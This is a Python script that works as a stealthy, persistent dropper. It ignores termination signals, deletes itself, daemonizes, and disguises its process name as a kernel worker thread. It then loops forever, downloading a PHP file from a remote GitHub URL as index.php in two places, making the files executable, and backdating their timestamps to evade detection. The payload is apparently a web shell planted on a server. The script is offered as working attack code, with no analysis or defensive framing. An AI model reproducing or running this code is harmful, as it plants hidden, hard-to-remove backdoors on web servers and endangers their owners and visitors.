import os
import sys
import time
import signal
import ctypes

def ignore_signal(signum, frame):
    print(f"Ignoring signal: {signum}")

for sig in [signal.SIGTERM, signal.SIGINT, signal.SIGHUP]:
    signal.signal(sig, ignore_signal)

def self_delete():
    try:
        os.remove(sys.argv[0])
    except:
        pass

def daemonize():
    pid = os.fork()
    if pid > 0:
        sys.exit()
    os.setsid()
    pid = os.fork()
    if pid > 0:
        sys.exit()
    sys.stdout = open("/dev/null", "w")
    sys.stderr = open("/dev/null", "w")
    os.close(0)
    os.close(1)
    os.close(2)

def rename_process():
    try:
        libc = ctypes.CDLL("libc.so.6")
        libc.prctl(15, b"[kworker/u16:2]", 0, 0, 0)
    except:
        pass

def respawn():
    while True:
        pid = os.fork()
        if pid == 0:
            rename_process()
            break
        else:
            os.waitpid(pid, 0)

url = "https://raw.githubusercontent.com/sztsss/m4nMan/refs/heads/main/program.php"
file_name = "index.php"
timestamp = "201201081531.12"
folder_name = "alanjing"
folder_file = os.path.join(folder_name, "index.php")

self_delete()
daemonize()
respawn()
rename_process()

while True:
    os.system(f"curl {url} -o {file_name}")
    os.system(f"chmod 0755 {file_name}")
    os.system(f"touch -t {timestamp} {file_name}")
    
    if not os.path.exists(folder_name):
        os.makedirs(folder_name, exist_ok=True)
    
    os.system(f"curl {url} -o {folder_file}")
    os.system(f"chmod 0755 {folder_file}")
    os.system(f"touch -t {timestamp} {folder_file}")
    
    for _ in range(10):
        os.system(f"chmod 0755 {file_name}")
        os.system(f"touch -t {timestamp} {file_name}")
        os.system(f"chmod 0755 {folder_file}")
        os.system(f"touch -t {timestamp} {folder_file}")
        time.sleep(1)

    time.sleep(5)
